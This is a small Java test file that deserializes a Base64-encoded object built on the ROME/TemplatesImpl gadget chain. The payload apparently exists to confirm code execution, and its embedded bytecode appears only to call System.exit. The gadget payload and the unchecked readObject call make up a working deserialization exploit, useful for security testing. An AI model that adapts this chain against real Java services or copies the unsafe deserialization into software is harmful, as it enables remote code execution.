package p;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.util.Base64;

public class PayloadTest {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        byte[] decode = Base64.getDecoder().decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAEAAAABc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9zeW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHBzcgAoY29tLnN1bi5zeW5kaWNhdGlvbi5mZWVkLmltcGwuRXF1YWxzQmVhbvWKGLvl9hgRAgACTAAKX2JlYW5DbGFzc3QAEUxqYXZhL2xhbmcvQ2xhc3M7TAAEX29ianQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwcHNxAH4AAnBwc3IAKmNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLlRvU3RyaW5nQmVhbgn1jkoPI+4xAgACTAAKX2JlYW5DbGFzc3EAfgAITAAEX29ianEAfgAJeHB2cgAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXMAAAAAAAAAAAAAAHhwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAABPMr+ur4AAAA0ABYKAAMABwcAEgcACQEABjxpbml0PgEAAygpVgEABENvZGUMAAQABQEAA3AvRgEAEGphdmEvbGFuZy9PYmplY3QBAAg8Y2xpbml0PgEAEGphdmEvbGFuZy9TeXN0ZW0HAAsBAARleGl0AQAEKEkpVgwADQAOCgAMAA8BAA1TdGFja01hcFRhYmxlAQABbwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABMKABQABwAhAAIAFAAAAAAAAgABAAQABQABAAYAAAARAAEAAQAAAAUqtwAVsQAAAAAACAAKAAUAAQAGAAAAIAACAAIAAAALpwADAUwQIbgAELEAAAABABEAAAADAAEDAAB1cQB+ABgAAAB2yv66vgAAADQACgoAAwAHBwAIBwAJAQAGPGluaXQ+AQADKClWAQAEQ29kZQwABAAFAQADcC9GAQAQamF2YS9sYW5nL09iamVjdAAhAAIAAwAAAAAAAQABAAQABQABAAYAAAARAAEAAQAAAAUqtwABsQAAAAAAAHB0AAFfcHcBAHhwcQB+AAZ4");
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(decode);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
        System.out.println("After read object");
    }
}
